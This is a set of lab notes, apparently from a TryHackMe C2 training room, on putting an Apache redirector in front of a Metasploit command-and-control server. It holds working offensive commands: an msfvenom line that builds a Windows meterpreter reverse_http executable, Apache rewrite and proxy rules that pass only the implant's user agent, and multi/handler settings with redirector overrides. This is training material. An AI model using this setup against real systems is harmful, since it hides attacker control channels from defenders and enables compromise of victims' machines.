# Improving Existing C2 Setups

## C2 Redirectors

Redirects HTTP/HTTPS request based Request Body, in the context production systems redirectors come in the form of a Load Balancer, similarly in the context of C2 Redirector sits between C2 server and Victim. For securities sake the Redirector needs to sit in front of both a C2 server and a Firewall to only accept valid interactions between C2 and victims.

#### Setup and Configuration
Enable relevant modules for C2 and Server:
Rewrite, to write rules to forward requests
Proxy and Proxy_\* - protocol 
Headers

The [THM Intro to  C2 Room](https://tryhackme.com/room/introtoc2) uses Apache2 and Metasploit
```bash
# Install Apache
apt install apache2
# Setup modules
a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
# MSFvenom alterations
msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

Note the use of `HttpUserAgent` parameter.

Now edit the apache2 configuration file found on debian based systems: `/etc/apache2/sites-available/000-default.conf`.

To enable the [mod_rewrite](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html)(check this link for a complete list of HTTP Request Targets) we must add `RewriteEngine On` onto a new line in the VirtualHost section.  

Then use a Regex so the server will **only** capture the NotMeterpreter User-Agent. adding the subsequent line `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"`

Finally adding thing ProxyPass feature of Apache's [mod_proxy](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html):  `ProxyPass "/" "http://localhost:8080/"`

Configure payload with advance options requires, for a list for each payload: 
```bash
msfvenom -p <payload> --list-options
```

Configure MSFconsole's multi/handler appropiately with examplification of advance use below:

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
msf6 exploit(multi/handler) > set OverrideLHOST <rediretor IP> # Override to match our setup
msf6 exploit(multi/handler) > set OverrideLPORT 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
msf6 exploit(multi/handler) > run
```


## References

[THM Intro to  C2 Room](https://tryhackme.com/room/introtoc2)
[Rewrite Engine](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html)
[mod_proxy module](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html)